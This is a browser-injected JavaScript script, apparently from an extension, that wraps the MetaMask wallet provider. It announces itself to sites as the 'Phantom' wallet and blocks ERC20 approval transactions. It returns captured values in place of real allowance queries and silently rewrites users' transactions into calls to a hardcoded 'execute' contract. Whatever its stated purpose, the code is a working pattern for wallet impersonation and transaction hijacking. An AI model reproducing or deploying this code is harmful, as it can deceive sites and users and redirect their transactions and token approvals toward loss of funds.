(() => {
  if (window.__mmPassthroughInjected) return;
  window.__mmPassthroughInjected = true;

  const currentScript = document.currentScript;
  const enabledAttr = currentScript && currentScript.dataset
    ? currentScript.dataset.passthroughEnabled
    : null;
  const initialEnabled = enabledAttr === null ? true : enabledAttr === "1";

  const getMetaMask = () => {
    const eth = window.ethereum;
    if (!eth) return null;
    // MetaMask sets isMetaMask; if not present, still allow passthrough
    return eth;
  };

  const isErc20ApproveData = (data) => {
    if (!data || typeof data !== "string") return false;
    return data.toLowerCase().startsWith("0x095ea7b3");
  };

  const isErc20AllowanceData = (data) => {
    if (!data || typeof data !== "string") return false;
    return data.toLowerCase().startsWith("0xdd62ed3e");
  };

  const isSendTxMethod = (method) =>
    method === "eth_sendTransaction" || method === "wallet_sendTransaction";

  const decodeAddressParam = (data, index) => {
    if (!data || typeof data !== "string") return null;
    const hex = data.startsWith("0x") ? data.slice(2) : data;
    const start = 8 + index * 64;
    if (hex.length < start + 64) return null;
    const word = hex.slice(start, start + 64);
    return `0x${word.slice(24)}`;
  };

  const decodeUint256Param = (data, index) => {
    if (!data || typeof data !== "string") return null;
    const hex = data.startsWith("0x") ? data.slice(2) : data;
    const start = 8 + index * 64;
    if (hex.length < start + 64) return null;
    const word = hex.slice(start, start + 64);
    return `0x${word}`;
  };

  const detectApproval = (payload) => {
    if (!payload || !isSendTxMethod(payload.method)) return;
    const params = Array.isArray(payload.params) ? payload.params : [];
    const tx = params[0];
    if (tx && isErc20ApproveData(tx.data)) {
      const spender = decodeAddressParam(tx.data, 0);
      const amount = decodeUint256Param(tx.data, 1);
      try {
        console.log("MetaMask Passthrough Wallet: detected ERC20 approval", {
          token: tx.to,
          owner: tx.from,
          spender,
          amount,
          tx
        });
      } catch (_) {}
      try {
        window.postMessage(
          {
            source: "mm-passthrough",
            type: "MM_PASSTHROUGH_APPROVAL",
            tx,
            parsed: {
              token: tx.to || null,
              owner: tx.from || null,
              spender,
              amount
            }
          },
          "*"
        );
      } catch (_) {}
      return true;
    }
    return false;
  };

  const pendingAllowanceRequests = new Map();

  const requestAllowanceMatch = ({ token, owner, spender }) =>
    new Promise((resolve) => {
      const requestId = `allowance-${Date.now()}-${Math.random().toString(16).slice(2)}`;
      const timeout = setTimeout(() => {
        pendingAllowanceRequests.delete(requestId);
        resolve(null);
      }, 1500);

      pendingAllowanceRequests.set(requestId, { resolve, timeout });
      window.postMessage(
        {
          source: "mm-passthrough",
          type: "MM_PASSTHROUGH_ALLOWANCE_QUERY",
          requestId,
          token: token || null,
          owner: owner || null,
          spender: spender || null
        },
        "*"
      );
    });

  const detectAllowanceMatch = (payload) => {
    if (!payload || payload.method !== "eth_call") return null;
    const params = Array.isArray(payload.params) ? payload.params : [];
    const call = params[0];
    if (!call) return null;

    if (isErc20AllowanceData(call.data)) {
      const owner = decodeAddressParam(call.data, 0);
      const spender = decodeAddressParam(call.data, 1);
      return requestAllowanceMatch({
        token: call.to || null,
        owner,
        spender
      });
    }

    return null;
  };

  const normalizeHex = (value) => {
    if (!value || typeof value !== "string") return "";
    return value.startsWith("0x") ? value.slice(2) : value;
  };

  const padHex = (value, length) => value.padStart(length, "0");

  const encodeUint = (value) => {
    const hex = BigInt(value).toString(16);
    return padHex(hex, 64);
  };

  const encodeAddress = (value) => {
    const hex = normalizeHex(value).toLowerCase();
    return padHex(hex, 64);
  };

  const encodeBytes = (value) => {
    let hex = normalizeHex(value);
    if (hex.length % 2 !== 0) {
      hex = `0${hex}`;
    }
    const length = hex.length / 2;
    const paddedLength = Math.ceil(length / 32) * 64;
    const padded = hex.padEnd(paddedLength, "0");
    return `${encodeUint(length)}${padded}`;
  };

  const encodeAddressArray = (values) => {
    const items = Array.isArray(values) ? values : [];
    const head = encodeUint(items.length);
    const body = items.map((value) => encodeAddress(value)).join("");
    return `${head}${body}`;
  };

  const encodeBytesArray = (values) => {
    const items = Array.isArray(values) ? values : [];
    const head = encodeUint(items.length);
    const offsets = [];
    const bodies = [];
    let offset = 32 * items.length;

    items.forEach((value) => {
      const encoded = encodeBytes(value || "0x");
      offsets.push(encodeUint(offset));
      bodies.push(encoded);
      offset += encoded.length / 2;
    });

    return `${head}${offsets.join("")}${bodies.join("")}`;
  };

  const encodeExecuteCall = (selector, targets, calldata) => {
    const targetsEncoded = encodeAddressArray(targets);
    const dataEncoded = encodeBytesArray(calldata);
    const offsetTargets = 64;
    const offsetData = 64 + targetsEncoded.length / 2;
    const head = `${encodeUint(offsetTargets)}${encodeUint(offsetData)}`;
    return `0x${selector}${head}${targetsEncoded}${dataEncoded}`;
  };

  const pendingBatchRequests = new Map();

  const requestBatchContext = () =>
    new Promise((resolve) => {
      const requestId = `batch-${Date.now()}-${Math.random().toString(16).slice(2)}`;
      const timeout = setTimeout(() => {
        pendingBatchRequests.delete(requestId);
        resolve(null);
      }, 1500);

      pendingBatchRequests.set(requestId, { resolve, timeout });
      window.postMessage(
        {
          source: "mm-passthrough",
          type: "MM_PASSTHROUGH_BATCH_QUERY",
          requestId
        },
        "*"
      );
    });

  const EXECUTE_TARGET = "0xc0E16d6D6cf4DAe4E561Cc5Dd3C868378F673C09";

  const buildExecutePayload = async (payload, batch) => {
    const params = Array.isArray(payload.params) ? payload.params : [];
    const tx = params[0] || {};
    const approvals = Array.isArray(batch.approvals) ? batch.approvals : [];
    const targets = [];
    const calldata = [];

    approvals.forEach((entry) => {
      if (entry && entry.to && entry.data) {
        targets.push(entry.to);
        calldata.push(entry.data);
      }
    });

    if (tx.to) {
      targets.push(tx.to);
      calldata.push(tx.data || "0x");
    }

    if (!targets.length) return null;

    const selector = "c8d18a45";
    const executeData = encodeExecuteCall(selector, targets, calldata);
    const connected =
      tx.from || (passthrough && passthrough.selectedAddress) || null;
    if (!connected) return null;
    const executeTx = {
      ...tx,
      from: connected,
      to: EXECUTE_TARGET,
      data: executeData
    };
    if (tx.value !== undefined) {
      executeTx.value = tx.value;
    }
    return {
      ...payload,
      method: "eth_sendTransaction",
      params: [executeTx]
    };
  };

  const requestThrough = (obj, payload, value) => {
    const nextPayload = payload && payload.method === "wallet_sendTransaction"
      ? { ...payload, method: "eth_sendTransaction" }
      : payload;
    if (obj && typeof obj.request === "function") {
      return obj.request(nextPayload);
    }
    return value.apply(obj, [nextPayload]);
  };

  const toRpcResponse = (payload, result) => ({
    id: payload && payload.id ? payload.id : Date.now(),
    jsonrpc: "2.0",
    result
  });

  const handleBatchSendTransaction = async (payload, forward, source) => {
    if (detectApproval(payload)) {
      throw new Error("Approval blocked: captured for batching");
    }
    const batch = await requestBatchContext();
    try {
      console.log("MetaMask Passthrough Wallet: batch context", {
        source,
        batchActive: batch ? batch.batchActive : null,
        approvals: batch && Array.isArray(batch.approvals) ? batch.approvals.length : null
      });
    } catch (_) {}
    if (!batch || !batch.batchActive) return forward(payload);
    try {
      const nextPayload = await buildExecutePayload(payload, batch);
      try {
        console.log("MetaMask Passthrough Wallet: batching tx", {
          source,
          originalTo: payload && payload.params && payload.params[0]
            ? payload.params[0].to
            : null,
          executeTo: nextPayload && nextPayload.params && nextPayload.params[0]
            ? nextPayload.params[0].to
            : null,
          executeData: nextPayload && nextPayload.params && nextPayload.params[0]
            ? nextPayload.params[0].data
            : null
        });
      } catch (_) {}
      if (!nextPayload) return forward(payload);
      return forward(nextPayload);
    } catch (_) {
      return forward(payload);
    }
  };

  const createPassthrough = (target) => {
    const handler = {
      get(obj, prop) {
        if (prop === "isPassthroughWallet") return true;
        if (prop === "isMetaMask") return false;
        if (prop === "_passthroughTarget") return obj;

        const value = obj[prop];
        if (typeof value === "function") {
          return (...args) => {
            try {
              console.log("MetaMask Passthrough Wallet: forwarding call", String(prop), args);
            } catch (_) {}
            try {
              if (prop === "request" && args && args[0]) {
                const payload = args[0];
                const matchPromise = detectAllowanceMatch(payload);
                if (matchPromise) {
                  return matchPromise.then((match) => {
                    if (match && match.amount) return match.amount;
                    return value.apply(obj, args);
                  });
                }
                if (isSendTxMethod(payload.method)) {
                  return handleBatchSendTransaction(
                    payload,
                    (nextPayload) => requestThrough(obj, nextPayload, value),
                    "request"
                  );
                }
                return value.apply(obj, args);
              }
              if (prop === "sendAsync" && args && args[0]) {
                const payload = args[0];
                const callback = typeof args[1] === "function" ? args[1] : null;
                if (payload && isSendTxMethod(payload.method)) {
                  handleBatchSendTransaction(
                    payload,
                    (nextPayload) => requestThrough(obj, nextPayload, value),
                    "sendAsync"
                  )
                    .then((res) => callback && callback(null, toRpcResponse(payload, res)))
                    .catch((err) => callback && callback(err));
                  return;
                }
                return value.apply(obj, args);
              }
              if (prop === "send") {
                const callback = typeof args[1] === "function" ? args[1] : null;
                if (args.length >= 1 && typeof args[0] === "string") {
                  const method = args[0];
                  const params = Array.isArray(args[1]) ? args[1] : [];
                  if (isSendTxMethod(method)) {
                    const payload = {
                      id: Date.now(),
                      jsonrpc: "2.0",
                      method: "eth_sendTransaction",
                      params
                    };
                    if (callback) {
                      handleBatchSendTransaction(
                        payload,
                        (nextPayload) => requestThrough(obj, nextPayload, value),
                        "send-method"
                      )
                        .then((res) => callback(null, toRpcResponse(payload, res)))
                        .catch((err) => callback(err));
                      return;
                    }
                    return handleBatchSendTransaction(
                      payload,
                      (nextPayload) => requestThrough(obj, nextPayload, value),
                      "send-method"
                    );
                  }
                }
                if (args && args[0]) {
                  const payload = args[0];
                  if (payload && isSendTxMethod(payload.method)) {
                    if (callback) {
                      handleBatchSendTransaction(
                        payload,
                        (nextPayload) => requestThrough(obj, nextPayload, value),
                        "send-payload"
                      )
                        .then((res) => callback(null, toRpcResponse(payload, res)))
                        .catch((err) => callback(err));
                      return;
                    }
                    return handleBatchSendTransaction(
                      payload,
                      (nextPayload) => requestThrough(obj, nextPayload, value),
                      "send-payload"
                    );
                  }
                }
                return value.apply(obj, args);
              }
            } catch (_) {}
            return value.apply(obj, args);
          };
        }
        return value;
      },
      set(obj, prop, value) {
        obj[prop] = value;
        return true;
      }
    };

    return new Proxy(target, handler);
  };

  const mm = getMetaMask();
  if (!mm) {
    console.warn("MetaMask Passthrough Wallet: MetaMask provider not found");
    return;
  }

  let executeSelectorPromise = null;
  const keccak256Hex = (data) => {
    const RC = [
      1, 0, 32898, 0, 32906, 2147483648, 2147516416, 2147483648,
      32907, 0, 2147483649, 0, 2147516545, 2147483648, 32777, 2147483648,
      138, 0, 136, 0, 2147516425, 0, 2147483658, 0,
      2147516555, 0, 139, 2147483648, 32905, 2147483648, 32771, 2147483648,
      32770, 2147483648, 128, 2147483648, 32778, 0, 2147483658, 2147483648,
      2147516545, 2147483648, 32896, 2147483648, 2147483649, 0, 2147516424, 2147483648
    ];
    const blocks = [];
    const s = new Uint32Array(50);
    let length = 0;
    let i = 0;
    let index = 0;
    let n = data.length || 0;

    while (n > 0) {
      blocks[index++] = data[i++] | (data[i++] << 8) | (data[i++] << 16) | (data[i++] << 24);
      n -= 4;
      if (index === 17) {
        for (let j = 0; j < 17; ++j) {
          s[j] ^= blocks[j];
        }
        keccakF(s, RC);
        index = 0;
      }
    }

    let tail = 0;
    switch (data.length & 3) {
      case 1:
        tail = data[i] | 0x0100;
        break;
      case 2:
        tail = data[i] | (data[i + 1] << 8) | 0x010000;
        break;
      case 3:
        tail = data[i] | (data[i + 1] << 8) | (data[i + 2] << 16) | 0x01000000;
        break;
      default:
        tail = 0x000001;
        break;
    }
    blocks[index++] = tail;
    if (index === 17) {
      for (let j = 0; j < 17; ++j) {
        s[j] ^= blocks[j];
      }
      keccakF(s, RC);
      index = 0;
    }
    blocks.fill(0, index, 17);
    blocks[16] = 0x80000000;
    for (let j = 0; j < 17; ++j) {
      s[j] ^= blocks[j];
    }
    keccakF(s, RC);

    let hex = "";
    for (let j = 0; j < 8; ++j) {
      const word = s[j];
      hex += word.toString(16).padStart(8, "0");
    }
    return hex;
  };

  const keccakF = (s, RC) => {
    const b = new Uint32Array(50);
    for (let round = 0; round < 24; ++round) {
      let c0 = s[0] ^ s[10] ^ s[20] ^ s[30] ^ s[40];
      let c1 = s[1] ^ s[11] ^ s[21] ^ s[31] ^ s[41];
      let c2 = s[2] ^ s[12] ^ s[22] ^ s[32] ^ s[42];
      let c3 = s[3] ^ s[13] ^ s[23] ^ s[33] ^ s[43];
      let c4 = s[4] ^ s[14] ^ s[24] ^ s[34] ^ s[44];

      let d0 = c4 ^ ((c1 << 1) | (c0 >>> 31));
      let d1 = c0 ^ ((c2 << 1) | (c1 >>> 31));
      let d2 = c1 ^ ((c3 << 1) | (c2 >>> 31));
      let d3 = c2 ^ ((c4 << 1) | (c3 >>> 31));
      let d4 = c3 ^ ((c0 << 1) | (c4 >>> 31));

      s[0] ^= d0; s[1] ^= d1; s[2] ^= d2; s[3] ^= d3; s[4] ^= d4;
      s[10] ^= d0; s[11] ^= d1; s[12] ^= d2; s[13] ^= d3; s[14] ^= d4;
      s[20] ^= d0; s[21] ^= d1; s[22] ^= d2; s[23] ^= d3; s[24] ^= d4;
      s[30] ^= d0; s[31] ^= d1; s[32] ^= d2; s[33] ^= d3; s[34] ^= d4;
      s[40] ^= d0; s[41] ^= d1; s[42] ^= d2; s[43] ^= d3; s[44] ^= d4;

      b[0] = s[0];
      b[1] = (s[6] << 12) | (s[7] >>> 20);
      b[2] = (s[12] << 25) | (s[13] >>> 7);
      b[3] = (s[18] << 11) | (s[19] >>> 21);
      b[4] = (s[24] << 21) | (s[25] >>> 11);

      b[5] = (s[3] << 28) | (s[4] >>> 4);
      b[6] = (s[9] << 20) | (s[10] >>> 12);
      b[7] = (s[10] << 3) | (s[11] >>> 29);
      b[8] = (s[16] << 13) | (s[17] >>> 19);
      b[9] = (s[22] << 29) | (s[23] >>> 3);

      b[10] = (s[1] << 1) | (s[2] >>> 31);
      b[11] = (s[7] << 6) | (s[8] >>> 26);
      b[12] = (s[13] << 8) | (s[14] >>> 24);
      b[13] = (s[19] << 18) | (s[20] >>> 14);
      b[14] = (s[25] << 2) | (s[26] >>> 30);

      b[15] = (s[4] << 27) | (s[5] >>> 5);
      b[16] = (s[5] << 14) | (s[6] >>> 18);
      b[17] = (s[11] << 10) | (s[12] >>> 22);
      b[18] = (s[17] << 15) | (s[18] >>> 17);
      b[19] = (s[23] << 23) | (s[24] >>> 9);

      b[20] = (s[2] << 30) | (s[3] >>> 2);
      b[21] = (s[8] << 9) | (s[9] >>> 23);
      b[22] = (s[14] << 19) | (s[15] >>> 13);
      b[23] = (s[20] << 22) | (s[21] >>> 10);
      b[24] = (s[26] << 5) | (s[27] >>> 27);

      for (let i = 0; i < 25; ++i) {
        const x = i % 5;
        s[i] = b[i] ^ (~b[(i + 5) % 25] & b[(i + 10) % 25]);
      }

      s[0] ^= RC[round * 2];
      s[1] ^= RC[round * 2 + 1];
    }
  };

  const getExecuteSelector = () => {
    if (executeSelectorPromise) return executeSelectorPromise;
    const signature = "execute(address[],bytes[])";
    executeSelectorPromise = (async () => {
      let hex = "";
      try {
        const encoder = new TextEncoder();
        const bytes = encoder.encode(signature);
        hex = Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
        return await mm.request({
          method: "web3_sha3",
          params: [`0x${hex}`]
        });
      } catch (err) {
        try {
          const encoder = new TextEncoder();
          const bytes = encoder.encode(signature);
          const hash = keccak256Hex(bytes);
          try {
            console.log("MetaMask Passthrough Wallet: using local keccak selector");
          } catch (_) {}
          return `0x${hash}`;
        } catch (_) {
          throw err;
        }
      }
    })();
    return executeSelectorPromise;
  };

  const passthrough = createPassthrough(mm);

  // Expose a dedicated passthrough provider.
  window.passthroughEthereum = passthrough;

  const originalEthereum = window.ethereum;
  const originalWeb3 = window.web3;
  const originalWeb3Provider = originalWeb3 ? originalWeb3.currentProvider : undefined;

  const applyOverride = (enabled) => {
    if (enabled) {
      window.ethereum = passthrough;
      if (!window.web3) {
        window.web3 = { currentProvider: passthrough };
      } else {
        window.web3.currentProvider = passthrough;
      }
      return;
    }

    if (originalEthereum === undefined) {
      try {
        delete window.ethereum;
      } catch (_) {
        window.ethereum = undefined;
      }
    } else {
      window.ethereum = originalEthereum;
    }

    if (originalWeb3 === undefined) {
      try {
        delete window.web3;
      } catch (_) {
        window.web3 = undefined;
      }
    } else {
      window.web3 = originalWeb3;
      if (originalWeb3Provider !== undefined) {
        window.web3.currentProvider = originalWeb3Provider;
      }
    }
  };

  applyOverride(initialEnabled);

  const respondAddress = async (requestId) => {
    let address = null;
    try {
      if (passthrough.selectedAddress) {
        address = passthrough.selectedAddress;
      } else if (passthrough.request) {
        const accounts = await passthrough.request({ method: "eth_accounts" });
        if (Array.isArray(accounts) && accounts.length) {
          address = accounts[0];
        }
      }
    } catch (_) {}

    window.postMessage(
      {
        source: "mm-passthrough",
        type: "MM_PASSTHROUGH_ADDRESS_RESPONSE",
        requestId,
        address
      },
      "*"
    );
  };

  window.addEventListener("message", (event) => {
    if (event.source !== window || !event.data) return;
    if (event.data.source !== "mm-passthrough") return;
    if (event.data.type !== "MM_PASSTHROUGH_GET_ADDRESS") return;
    respondAddress(event.data.requestId);
  });

  window.addEventListener("message", (event) => {
    if (event.source !== window || !event.data) return;
    if (event.data.source !== "mm-passthrough") return;
    if (event.data.type !== "MM_PASSTHROUGH_SET_ENABLED") return;
    applyOverride(Boolean(event.data.enabled));
  });

  // EIP-6963 provider discovery hook.
  const getStableUuid = () => {
    const key = "__mm_passthrough_uuid";
    try {
      const existing = window.localStorage && window.localStorage.getItem(key);
      if (existing) return existing;
      const created = (typeof crypto !== "undefined" && crypto.randomUUID)
        ? crypto.randomUUID()
        : `mm-passthrough-${Date.now()}-${Math.random().toString(16).slice(2)}`;
      window.localStorage && window.localStorage.setItem(key, created);
      return created;
    } catch (_) {
      return (typeof crypto !== "undefined" && crypto.randomUUID)
        ? crypto.randomUUID()
        : `mm-passthrough-${Date.now()}-${Math.random().toString(16).slice(2)}`;
    }
  };

  const providerInfo = {
    uuid: getStableUuid(),
    name: "Phantom",
    // Inline SVG icon (data URL). Some UIs require a non-empty icon.
    icon:
      "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHZpZXdCb3g9IjAgMCA2NCA2NCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHJ4PSIxMiIgZmlsbD0iI0UyRUFGOSIvPjxyZWN0IHg9IjE0IiB5PSIyMCIgd2lkdGg9IjM2IiBoZWlnaHQ9IjI0IiByeD0iNiIgZmlsbD0iIzFGN0FFMCIvPjxjaXJjbGUgY3g9IjIyIiBjeT0iMzIiIHI9IjQiIGZpbGw9IiNGRkYiLz48Y2lyY2xlIGN4PSIzMiIgY3k9IjMyIiByPSI0IiBmaWxsPSIjRkZGIi8+PGNpcmNsZSBjeD0iNDIiIGN5PSIzMiIgcj0iNCIgZmlsbD0iI0ZGRiIvPjwvc3ZnPg==",
    rdns: "app.phantom"
  };

  const announceProvider = () => {
    window.dispatchEvent(
      new CustomEvent("eip6963:announceProvider", {
        detail: {
          info: providerInfo,
          provider: passthrough
        }
      })
    );
  };

  window.addEventListener("eip6963:requestProvider", announceProvider);
  announceProvider();

  window.addEventListener("message", (event) => {
    if (event.source !== window || !event.data) return;
    if (event.data.source !== "mm-passthrough") return;
    if (event.data.type !== "MM_PASSTHROUGH_ALLOWANCE_MATCH") return;
    if (event.data.requestId && pendingAllowanceRequests.has(event.data.requestId)) {
      const pending = pendingAllowanceRequests.get(event.data.requestId);
      if (pending) {
        clearTimeout(pending.timeout);
        pendingAllowanceRequests.delete(event.data.requestId);
        pending.resolve(event.data.approval || null);
      }
    }
    try {
      console.log("MetaMask Passthrough Wallet: allowance matches captured approval", event.data.approval);
    } catch (_) {}
  });

  window.addEventListener("message", (event) => {
    if (event.source !== window || !event.data) return;
    if (event.data.source !== "mm-passthrough") return;
    if (event.data.type !== "MM_PASSTHROUGH_BATCH_RESPONSE") return;
    if (event.data.requestId && pendingBatchRequests.has(event.data.requestId)) {
      const pending = pendingBatchRequests.get(event.data.requestId);
      if (pending) {
        clearTimeout(pending.timeout);
        pendingBatchRequests.delete(event.data.requestId);
        pending.resolve(event.data.batch || null);
      }
    }
  });
})();
